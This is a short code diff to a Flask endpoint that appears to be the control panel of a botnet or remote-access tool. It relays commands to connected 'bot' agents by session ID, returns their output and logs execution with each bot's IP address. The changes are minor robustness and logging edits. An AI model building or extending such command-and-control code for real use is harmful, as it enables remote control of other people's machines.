@@ -161,7 +161,7 @@ def upload_file():
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
     data = request.get_json()
-    session_id = data.get('session_id')
+    session_id = int(data.get('session_id'))  # Convert to int since it comes as string from JS
     command = data.get('command')
     
     if session_id not in Bot.botList:
@@ -174,13 +174,16 @@ def send_command():
         
         # Get response from agent
         response = bot.reliable_recv()
-        
+        if response is None:  # Handle connection issues
+            raise Exception("No response from agent")
+            
         # Update last seen time
         bot.update_last_seen()
         
         # Log command execution
-        logging.info(f"Command sent to Session {session_id} ({bot.ip}): {command}")
+        logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
         
+        # Add command to history
         return jsonify({
             'success': True,
             'output': response,
